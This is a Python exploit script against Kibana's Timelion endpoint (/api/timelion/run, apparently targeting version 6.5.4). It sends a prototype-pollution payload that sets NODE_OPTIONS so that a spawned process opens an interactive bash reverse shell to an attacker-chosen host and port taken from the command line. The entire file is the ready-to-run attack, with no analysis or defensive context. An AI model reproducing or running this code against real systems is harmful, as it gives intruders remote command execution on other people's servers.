# coding:utf-8

import requests
import sys
import json

def RCE(url,RHOST,RPORT):
    if url[-1] == '/':
        vulnUrl = url+"api/timelion/run"
    else:
        vulnUrl = url+"/api/timelion/run"

    head = {
        "Accept":"application/json,text/plain,*/*",
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
        "Content-Type":"application/json;charset=UTF-8",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Connection":"close",
        "kbn-version":"6.5.4"
    }
    data = {
        "sheet": [".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& /dev/tcp/%s/%s 0>&1\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')" % (RHOST,RPORT)],
        "time": {"from": "now-15m", "to": "now", "mode": "quick", "interval": "auto", "timezone": "Asia/Shanghai"}
    }
    # proxy = {"http":"http://127.0.0.1:8090"}
    r = requests.post(headers=head,url=vulnUrl,data=json.dumps(data))
    if r.status_code == 200 and "sheet" in r.text:
        print "Exploit Success!"
    else:
        print("something wrong,maybe not useful")


def main():
    url = sys.argv[1]
    ip = sys.argv[2]
    port = sys.argv[3]
    # print url,ip,port
    try:
        RCE(url,ip,port)
    except Exception as e:
        print("something wrong~")


if __name__ == '__main__':
    main()

